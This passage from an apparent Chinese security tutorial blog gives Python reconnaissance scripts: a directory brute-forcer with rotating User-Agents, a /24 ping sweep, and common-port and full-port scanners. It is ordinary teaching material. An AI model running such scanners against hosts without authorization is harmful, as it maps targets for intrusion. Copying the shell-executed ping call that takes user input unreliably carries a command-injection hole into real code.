class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Queue<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">from</span> collections.abc <span class="hljs-keyword">import</span> <span class="hljs-type">Callable</span>,Iterable,Mapping<br><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">Any</span><br><span class="hljs-keyword">from</span> fake_useragent <span class="hljs-keyword">import</span> UserAgent<br><span class="hljs-comment">#使用fake_useragent包导入随机UA头</span><br>random_UA = UserAgent()<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">DirScan</span>(threading.Thread):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,queue</span>):<br>        threading.Thread.__init__(self)<br>        self.queue = queue<br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment">#获取队列中的url</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> self.queue.empty():<br>            url = self.queue.get()<br>            <br>            <span class="hljs-keyword">try</span>:<br>                headers = &#123;<br>                    <span class="hljs-string">&quot;User-Agent&quot;</span>:random_UA.random<br>                &#125;<br>                r = requests.get(url=url,headers=headers,timeout=<span class="hljs-number">2</span>)<br>                <span class="hljs-keyword">if</span> r.status_code == <span class="hljs-number">200</span>:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*] %s&#x27;</span> % url)<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-comment">#print(&quot;没有此路径&quot;)</span><br>                    <span class="hljs-keyword">pass</span><br>            <span class="hljs-keyword">except</span>:<br>                <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>(<span class="hljs-params">url,ext,count</span>):<br>    <span class="hljs-comment">#将待拼接的路径传入队列</span><br>    queue = Queue()<br>    f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;%s.txt&#x27;</span> % ext,<span class="hljs-string">&#x27;r&#x27;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> f:<br>        queue.put(url+i.rstrip(<span class="hljs-string">&#x27;\n&#x27;</span>))    <br>    <br>    <span class="hljs-comment">#多线程</span><br>    threads = []<br>    thread_count = <span class="hljs-built_in">int</span>(count)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(thread_count):<br>        threads.append(DirScan(queue))<br>    <br>    <span class="hljs-comment">#开启线程</span><br>    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:<br>        t.start()<br>    <br>    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:<br>        t.join()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    url = <span class="hljs-string">&#x27;https://www.baidu.com&#x27;</span><br>    ext = <span class="hljs-string">&#x27;xxx&#x27;</span><br>    count = <span class="hljs-number">16</span><br>    start(url,ext,count)<br><br></code></pre></td></tr></table></figure><h2 id="C段扫描器"><a href="#C段扫描器" class="headerlink" title="C段扫描器"></a>C段扫描器</h2><p>原理：执行ping命令 是否有回显</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Queue<br><span class="hljs-keyword">from</span> subprocess <span class="hljs-keyword">import</span> Popen,PIPE<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">CScan</span>(threading.Thread):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,queue</span>):<br>        threading.Thread.__init__(self)<br>        self.queue = queue<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>):<br><br>        <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> self.queue.empty():<br>            ip = self.queue.get()<br><br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-comment">#执行ping命令</span><br>                check_ping = Popen(<span class="hljs-string">&quot;ping &#123;0&#125; \n&quot;</span>.<span class="hljs-built_in">format</span>(ip),stdin=PIPE,stdout=PIPE,shell=<span class="hljs-literal">True</span>)<br>                data = check_ping.stdout.read()<br>                <span class="hljs-comment">#数据要转为str</span><br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;TTL&quot;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(data):<br>                    <span class="hljs-built_in">print</span>(ip+<span class="hljs-string">&quot; id up!\n&quot;</span>)<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-built_in">print</span>(ip+<span class="hljs-string">&quot; 不在线 \n&quot;</span>)<br>            <span class="hljs-keyword">except</span>:<br>                <span class="hljs-keyword">pass</span><br><span class="hljs-comment">#多线程</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>(<span class="hljs-params">count,ip</span>):<br>    queue = Queue()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">255</span>):<br>        queue.put(ip+<span class="hljs-string">&#x27;.&#x27;</span>+<span class="hljs-built_in">str</span>(i))<br><br>    <span class="hljs-comment">#多线程</span><br>    threads = []<br>    thread_count = <span class="hljs-built_in">int</span>(count)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(thread_count):<br>        threads.append(CScan(queue))<br>    <span class="hljs-comment">#开启线程</span><br>    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:<br>        t.start()<br>    <br>    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:<br>        t.join()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    count = <span class="hljs-number">16</span><br>    ip = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入要扫描的ip段：&quot;</span>)<br>    start(count,ip)<br><br></code></pre></td></tr></table></figure><h2 id="端口扫描器"><a href="#端口扫描器" class="headerlink" title="端口扫描器"></a>端口扫描器</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-comment">#核心功能 待优化  结合C段扫描的功能</span><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_port_open</span>(<span class="hljs-params">host,port</span>):<br>    s = socket.socket()<br>    <span class="hljs-keyword">try</span>:<br>        s.connect((host,port))<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <br>host = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;enter the host:&quot;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#版本1  扫描C段的同时扫描存活主机的端口号</span><br><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Queue<br><span class="hljs-keyword">from</span> subprocess <span class="hljs-keyword">import</span> Popen,PIPE<br><br><span class="hljs-comment">#常见端口  自定义</span><br>common_port = [<span class="hljs-string">&#x27;21&#x27;</span>,<span class="hljs-string">&#x27;22&#x27;</span>,<span class="hljs-string">&#x27;80&#x27;</span>,<span class="hljs-string">&#x27;1433&#x27;</span>,<span class="hljs-string">&#x27;1521&#x27;</span>,<span class="hljs-string">&#x27;3306&#x27;</span>,<span class="hljs-string">&#x27;8080&#x27;</span>,<span class="hljs-string">&#x27;23&#x27;</span>,<span class="hljs-string">&#x27;25&#x27;</span>,<span class="hljs-string">&#x27;53&#x27;</span>,<span class="hljs-string">&#x27;137&#x27;</span>,<span class="hljs-string">&#x27;138&#x27;</span>,<span class="hljs-string">&#x27;139&#x27;</span>,<span class="hljs-string">&#x27;443&#x27;</span>,<span class="hljs-string">&#x27;7890&#x27;</span>]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_port_open</span>(<span class="hljs-params">host,port</span>):<br>    s = socket.socket()<br>    <span class="hljs-keyword">try</span>:<br>        s.connect((host,port))<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">CScan</span>(threading.Thread):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,queue</span>):<br>        threading.Thread.__init__(self)<br>        self.queue = queue<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>):<br><br>        <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> self.queue.empty():<br>            ip = self.queue.get()<br><br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-comment">#执行ping命令</span><br>                check_ping = Popen(<span class="hljs-string">&quot;ping &#123;0&#125; \n&quot;</span>.<span class="hljs-built_in">format</span>(ip),stdin=PIPE,stdout=PIPE,shell=<span class="hljs-literal">True</span>)<br>                data = check_ping.stdout.read()<br>                <span class="hljs-comment">#数据要转为str</span><br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;TTL&quot;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(data):<br>                    <span class="hljs-built_in">print</span>(ip+<span class="hljs-string">&quot; is up!\n&quot;</span>)<br>                    <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> common_port:<br>                        <span class="hljs-keyword">if</span> is_port_open(ip,<span class="hljs-built_in">int</span>(p)):<br>                            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*] &#x27;</span>+ip+<span class="hljs-string">&#x27;:&#x27;</span>+p+<span class="hljs-string">&quot; is open!&quot;</span>)<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-built_in">print</span>(ip+<span class="hljs-string">&quot; 不在线 \n&quot;</span>)<br>            <span class="hljs-keyword">except</span>:<br>                <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>(<span class="hljs-params">count,ip</span>):<br>    queue = Queue()<br>    <br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">255</span>):<br>        queue.put(ip+<span class="hljs-string">&#x27;.&#x27;</span>+<span class="hljs-built_in">str</span>(i))<br><br>    <span class="hljs-comment">#多线程</span><br>    threads = []<br>    thread_count = <span class="hljs-built_in">int</span>(count)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(thread_count):<br>        threads.append(CScan(queue))<br>    <br>    <span class="hljs-comment">#开启线程</span><br>    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:<br>        t.start()<br>    <br>    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:<br>        t.join()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    count = <span class="hljs-number">16</span><br>    ip = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入要扫描的ip段：&quot;</span>)<br>    start(count,ip)<br><br></code></pre></td></tr></table></figure><p>优化：</p><p>思路：</p><p>1.使用argparse模块  写成脚本形式</p><p>2.参数设置</p><p>-c  –Cduan  仅扫描输入ip的c段</p><p>-p  –port  仅扫描输入ip的端口号（默认使用常见端口测试）</p><p>-t  –target   指定目标</p><p>-a  –all   扫描输入的ip的C段并且扫描每个存活ip的端口开放情况</p><p>-ap –all_port  全端口扫描 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Queue<br><span class="hljs-keyword">from</span> subprocess <span class="hljs-keyword">import</span> Popen,PIPE<br><span class="hljs-keyword">from</span> argparse <span class="hljs-keyword">import</span> ArgumentParser<br><br><span class="hljs-comment">#常见端口  自定义</span><br>common_port = [<span class="hljs-number">21</span>,<span class="hljs-number">22</span>,<span class="hljs-number">80</span>,<span class="hljs-number">1433</span>,<span class="hljs-number">1521</span>,<span class="hljs-number">3306</span>,<span class="hljs-number">8080</span>,<span class="hljs-number">23</span>,<span class="hljs-number">25</span>,<span class="hljs-number">53</span>,<span class="hljs-number">137</span>,<span class="hljs-number">138</span>,<span class="hljs-number">139</span>,<span class="hljs-number">443</span>,<span class="hljs-number">7890</span>]<br><br><span class="hljs-comment">#端口扫描核心代码</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_port_open</span>(<span class="hljs-params">ip,port</span>):<br>    s = socket.socket()<br>    <span class="hljs-keyword">try</span>:<br>        s.connect((ip,port))<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">pScan</span>(threading.Thread):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,queue,args</span>):<br>        threading.Thread.__init__(self)<br>        self.queue = queue<br>        self.args = args<br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>):<br>        args = self.args<br>        <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> self.queue.empty():<br>            ip = self.queue.get()<br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-comment">#端口扫描</span><br>                <span class="hljs-keyword">if</span> args.portScan:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;target:&quot;</span>+ip)<br>                    <span class="hljs-keyword">if</span> args.all_port:<br>                        <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">65536</span>):<br>                            <span class="hljs-keyword">if</span> is_port_open(ip,p):<br>                                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] &quot;</span>+ip+<span class="hljs-string">&quot;:&quot;</span>+<span class="hljs-built_in">str</span>(p)+<span class="hljs-string">&quot; is open!&quot;</span>)<br>                            <span class="hljs-keyword">else</span>:<br>                                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-] &quot;</span>+ip+<span class="hljs-string">&quot;:&quot;</span>+<span class="hljs-built_in">str</span>(p)+<span class="hljs-string">&quot; is not open!&quot;</span>)<br>                    <span class="hljs-keyword">else</span>:<br>                        <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> common_port:<br>                            <span class="hljs-comment">#print(p)</span><br>                            <span class="hljs-keyword">if</span> is_port_open(ip,p):<br>                                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] &quot;</span>+ip+<span class="hljs-string">&quot;:&quot;</span>+<span class="hljs-built_in">str</span>(p)+<span class="hljs-string">&quot; is open!&quot;</span>)<br>                            <span class="hljs-keyword">else</span>:<br>                                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-] &quot;</span>+ip+<span class="hljs-string">&quot;:&quot;</span>+<span class="hljs-built_in">str</span>(p)+<span class="hljs-string">&quot; is not open!&quot;</span>)<br>                <span class="hljs-comment">#C段扫描</span><br>                <span class="hljs-keyword">elif</span> args.CduanScan:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;target:&quot;</span>+ip)<br>                    <span class="hljs-comment">#执行ping命令</span><br>                    check_ping = Popen(<span class="hljs-string">&quot;ping &#123;0&#125; \n&quot;</span>.<span class="hljs-built_in">format</span>(ip),stdin=PIPE,stdout=PIPE,shell=<span class="hljs-literal">True</span>)<br>                    data = check_ping.stdout.read()<br>                    <br>                    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;TTL&quot;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(data):<br>                        <span class="hljs-built_in">print</span>(ip+<span class="hljs-string">&quot; is up!&quot;</span>)<br>                        <span class="hljs-comment">#判断是否两者一起</span><br>                        <span class="hljs-keyword">if</span> args.all_scan:<br>                            <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> common_port:<br>                                <span class="hljs-keyword">if</span> is_port_open(ip,p):<br>                                    <span class="hljs-comment">#数据要转为str</span><br>                                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*] &#x27;</span>+ip+<span class="hljs-string">&#x27;:&#x27;</span>+<span class="hljs-built_in">str</span>(p)+<span class="hljs-string">&quot; is open!&quot;</span>)<br>                                <span class="hljs-keyword">else</span>:<br>                                    <span class="hljs-keyword">pass</span><br>                    <span class="hljs-keyword">else</span>:<br>                        <span class="hljs-built_in">print</span>(ip+<span class="hljs-string">&quot; 不在线 \n&quot;</span>)<br>            <span class="hljs-keyword">except</span>:<br>                <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>(<span class="hljs-params">count,args</span>):<br>    queue = Queue()<br>    <span class="hljs-comment">#根据命令行参数来判断传入队列的ip信息</span><br>    <span class="hljs-keyword">if</span> args.portScan:<br>        queue.put(args.target)<br>    <span class="hljs-keyword">elif</span> args.CduanScan:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">255</span>):<br>            queue.put(args.target+<span class="hljs-string">&#x27;.&#x27;</span>+<span class="hljs-built_in">str</span>(i))<br>        <br>    <span class="hljs-comment">#多线程</span><br>    threads = []<br>    thread_count = <span class="hljs-built_in">int</span>(count)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(thread_count):<br>        threads.append(pScan(queue,args))<br>    <span class="hljs-comment">#开启线程</span><br>    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:<br>        t.start()<br>    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:<br>        t.join()<br><br><span class="hljs-comment">#脚本参数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">setParser</span>():<br>    parser = ArgumentParser(<br>        prog = <span class="hljs-string">&quot;端口+C段扫描器&quot;</span>,<br>        description = <span class="hljs-string">&quot;r1&#x27;s tool&quot;</span><br>    )<br><br>    <span class="hljs-comment">#定义命令行参数</span><br>    parser.add_argument(<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;--CduanScan&quot;</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;仅扫描C段&quot;</span>,action=<span class="hljs-string">&quot;store_true&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-p&quot;</span>,<span class="hljs-string">&quot;--portScan&quot;</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;仅扫描端口（默认使用常用端口号）&quot;</span>,action=<span class="hljs-string">&quot;store_true&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-t&quot;</span>,<span class="hljs-string">&quot;--target&quot;</span>,default=<span class="hljs-number">0</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;指定目标&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-a&quot;</span>,<span class="hljs-string">&quot;--all_scan&quot;</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;扫描输入的ip段的C段和存活ip的端口开放情况（默认使用常用端口号）&quot;</span>,action=<span class="hljs-string">&quot;store_true&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-ap&quot;</span>,<span class="hljs-string">&quot;--all_port&quot;</span>,action=<span class="hljs-string">&quot;store_true&quot;</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;全端口扫描&quot;</span>)<br>    <span class="hljs-keyword">return</span> parser.parse_args()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    args = setParser()<br>    <span class="hljs-keyword">if</span> args.target:<br>        start(<span class="hljs-number">16</span>,args)<br><br></code></pre></td></tr></table></figure><p><img src="/img/image-20230922164531423-1701333286922-23.png" alt="image-20230922164531423"></p><p>C段扫描：</p><img src="/img/image-20230922165237281-1701333286921-1.png" alt="image-20230922165237281" style="zoom:67%;" /><p>端口扫描：</p><img src="/img/image-20230922170227265-1701333286922-2.png" alt="image-20230922170227265" style="zoom:67%;" /><p>扫C段并且扫描存活主机的端口：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python .\pScanV2<span class="hljs-selector-class">.py</span> -t xxx -<span class="hljs-selector-tag">a</span> -c<br></code></pre></td></tr></table></figure><h2 id="whois信息收集"><a href="#whois信息收集" class="headerlink" title="whois信息收集"></a>whois信息收集</h2><p>思路：</p><p>1.判断此域名是否存在   </p><p>2.使用whois命令（pip install python-whois）或者调用网站(<a href="https://whois.chinaz.com/)%E6%9D%A5%E6%9F%A5%E8%AF%A2">https://whois.chinaz.com/)来查询</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">import</span> whois<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_registered</span>(<span class="hljs-params">domain_name</span>):<br>    <span class="hljs-keyword">try</span>:<br>        w = whois.whois(domain_name)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">bool</span>(w.domain_name)<br>    <br><span class="hljs-keyword">if</span> __name__ == <span 